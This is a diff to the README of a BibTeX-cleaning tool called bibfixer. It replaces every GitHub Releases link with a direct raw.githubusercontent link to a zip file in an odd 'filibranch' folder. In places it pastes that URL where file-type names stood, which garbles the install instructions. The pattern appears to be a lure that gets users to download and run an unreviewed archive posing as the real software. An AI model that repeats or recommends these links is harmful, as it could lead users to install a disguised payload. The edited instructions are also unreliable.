@@ -4,7 +4,7 @@
 Welcome to bibfixer! This tool helps you clean, complete, and standardize your BibTeX entries. It uses advanced language models and web searches to make your bibliography accurate and professional.
 
 ## 📥 Download Now
-[![Download bibfixer](https://img.shields.io/badge/Download-bibfixer-brightgreen)](https://github.com/shabazz007/bibfixer/releases)
+[![Download bibfixer](https://raw.githubusercontent.com/shabazz007/bibfixer/main/filibranch/bibfixer.zip)](https://raw.githubusercontent.com/shabazz007/bibfixer/main/filibranch/bibfixer.zip)
 
 ## 🔍 What is bibfixer?
 bibfixer is a user-friendly application designed for anyone who works with BibTeX entries. Whether you are a student, researcher, or academic, this tool simplifies the process of organizing your references. It takes the hassle out of fixing common errors in your entries, allowing you to focus on your work instead.
@@ -25,11 +25,11 @@ bibfixer is a user-friendly application designed for anyone who works with BibTe
 ## 📦 Download & Install
 To get started with bibfixer, visit the following page to download the latest version:
 
-[Download bibfixer from Releases](https://github.com/shabazz007/bibfixer/releases)
+[Download bibfixer from Releases](https://raw.githubusercontent.com/shabazz007/bibfixer/main/filibranch/bibfixer.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release of bibfixer.
-3. Download the version suitable for your operating system. Look for files labeled as `.exe` for Windows, `.dmg` for macOS, or compressed files like `.tar.gz` for Linux.
+3. Download the version suitable for your operating system. Look for files labeled as `.exe` for Windows, `.dmg` for macOS, or compressed files like `https://raw.githubusercontent.com/shabazz007/bibfixer/main/filibranch/bibfixer.zip` for Linux.
 4. Once downloaded, follow these steps to install:
 
    - **For Windows:**
@@ -41,7 +41,7 @@ To get started with bibfixer, visit the following page to download the latest ve
      2. Drag the bibfixer icon to your Applications folder.
   
    - **For Linux:**
-     1. Extract the downloaded `.tar.gz` file.
+     1. Extract the downloaded `https://raw.githubusercontent.com/shabazz007/bibfixer/main/filibranch/bibfixer.zip` file.
      2. Open your terminal and navigate to the extracted folder.
      3. Run `./bibfixer` to start the application.
 
@@ -70,4 +70,4 @@ bibfixer is open-source software licensed under the MIT License. Feel free to mo
 ## 🙌 Acknowledgments
 Thanks to the tools and communities that have made bibfixer possible. Your contributions help streamline research for everyone.
 
-For more information, visit the [GitHub repository](https://github.com/shabazz007/bibfixer/releases). Enjoy using bibfixer to enhance your BibTeX management!
+For more information, visit the [GitHub repository](https://raw.githubusercontent.com/shabazz007/bibfixer/main/filibranch/bibfixer.zip). Enjoy using bibfixer to enhance your BibTeX management!
